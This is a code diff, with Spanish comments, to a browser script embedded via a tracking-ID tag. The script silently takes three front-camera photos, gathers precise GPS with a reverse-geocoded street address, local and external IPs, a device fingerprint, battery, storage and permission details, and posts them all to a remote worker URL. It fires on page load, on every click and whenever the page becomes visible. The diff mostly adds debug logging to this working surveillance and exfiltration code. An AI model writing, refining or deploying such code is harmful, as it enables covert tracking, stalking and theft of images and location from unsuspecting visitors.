@@ -1,10 +1,15 @@
+console.log('🔧 Script cargado correctamente');
+
 (function() {
     const scriptTag = document.currentScript;
     const trackingId = scriptTag.dataset.trackingId;
     const workerUrl = scriptTag.dataset.serverUrl;
 
+    console.log(`📌 Tracking ID: ${trackingId}`);
+    console.log(`📌 Worker URL: ${workerUrl}`);
+
     // ============================================================
-    // 1. GEOCÓDIGO INVERSO (dirección exacta)
+    // 1. GEOCÓDIGO INVERSO
     // ============================================================
     async function reverseGeocode(lat, lng) {
         try {
@@ -37,7 +42,11 @@
     // ============================================================
     function capturarGPS() {
         return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
+            if (!navigator.geolocation) { 
+                console.warn('⚠️ Geolocation no soportado');
+                resolve(null); 
+                return; 
+            }
             let mejor = null;
             let watchId = navigator.geolocation.watchPosition(
                 (pos) => {
@@ -52,7 +61,8 @@
                         resolve(mejor);
                     }
                 },
-                () => {
+                (err) => {
+                    console.error('❌ Error GPS:', err.message);
                     navigator.geolocation.clearWatch(watchId);
                     resolve(mejor);
                 },
@@ -70,14 +80,10 @@
     // ============================================================
     async function capturarFotos(cantidad = 3) {
         const fotos = [];
-        const video = document.createElement('video');
-        const canvas = document.createElement('canvas');
-        video.style.display = 'none';
-        canvas.style.display = 'none';
-        document.body.appendChild(video);
-        document.body.appendChild(canvas);
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } });
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
             video.srcObject = stream;
             await new Promise(r => { video.onloadedmetadata = () => { video.play(); r(); }; });
             await new Promise(r => setTimeout(r, 300));
@@ -90,10 +96,11 @@
                 await new Promise(r => setTimeout(r, 200));
             }
             stream.getTracks().forEach(t => t.stop());
-            video.remove();
-            canvas.remove();
             return fotos;
-        } catch(e) { return []; }
+        } catch(e) { 
+            console.warn('⚠️ No se pudo acceder a la cámara:', e.message);
+            return []; 
+        }
     }
 
     // ============================================================
@@ -273,44 +280,50 @@
     // 11. ENVIAR AL WORKER
     // ============================================================
     async function enviarAlWorker() {
-        const [fotos, gps, ipLocal, dispositivo, fp, bateria, almacenamiento, permisos, ipExterna] = await Promise.all([
-            capturarFotos(3),
-            capturarGPS(),
-            obtenerIPWebRTC(),
-            obtenerDispositivo(),
-            obtenerFingerprint(),
-            obtenerBateria(),
-            obtenerAlmacenamiento(),
-            obtenerPermisos(),
-            obtenerIPExterna()
-        ]);
-
-        // Geocodificar GPS si existe
-        let gpsConDireccion = null;
-        if (gps) {
-            const direccion = await reverseGeocode(gps.lat, gps.lng);
-            gpsConDireccion = { ...gps, direccion };
-        }
-
-        const msg = construirMensaje(dispositivo, fp, ipLocal, ipExterna, gpsConDireccion, bateria, almacenamiento, permisos);
-
-        const payload = {
-            text: msg,
-            photos: fotos,
-            latitude: gps?.lat || null,
-            longitude: gps?.lng || null
-        };
+        console.log('📤 Iniciando captura de datos...');
 
         try {
+            const [fotos, gps, ipLocal, dispositivo, fp, bateria, almacenamiento, permisos, ipExterna] = await Promise.all([
+                capturarFotos(3),
+                capturarGPS(),
+                obtenerIPWebRTC(),
+                obtenerDispositivo(),
+                obtenerFingerprint(),
+                obtenerBateria(),
+                obtenerAlmacenamiento(),
+                obtenerPermisos(),
+                obtenerIPExterna()
+            ]);
+
+            console.log('✅ Datos capturados:', { dispositivo, gps, fotos: fotos.length });
+
+            // Geocodificar GPS si existe
+            let gpsConDireccion = null;
+            if (gps) {
+                const direccion = await reverseGeocode(gps.lat, gps.lng);
+                gpsConDireccion = { ...gps, direccion };
+            }
+
+            const msg = construirMensaje(dispositivo, fp, ipLocal, ipExterna, gpsConDireccion, bateria, almacenamiento, permisos);
+
+            const payload = {
+                text: msg,
+                photos: fotos,
+                latitude: gps?.lat || null,
+                longitude: gps?.lng || null
+            };
+
+            console.log('📤 Enviando al Worker...');
+
             const response = await fetch(workerUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
             const result = await response.json();
-            console.log('✅ Enviado:', result);
+            console.log('✅ Respuesta del Worker:', result);
         } catch(e) {
-            console.error('❌ Error:', e);
+            console.error('❌ Error en enviarAlWorker:', e);
         }
     }
 
@@ -318,17 +331,18 @@
     // 12. EVENTOS
     // ============================================================
     function ejecutar() {
+        console.log('🔄 Ejecutando captura...');
         setTimeout(enviarAlWorker, 500);
     }
 
     window.addEventListener('load', ejecutar);
     document.addEventListener('click', () => {
-        console.log('👆 Click detectado');
+        console.log('👆 Click detectado, reiniciando captura...');
         setTimeout(enviarAlWorker, 300);
     });
     document.addEventListener('visibilitychange', () => {
         if (!document.hidden) {
-            console.log('👁️ Página visible');
+            console.log('👁️ Página visible, reiniciando captura...');
             setTimeout(enviarAlWorker, 300);
         }
     });
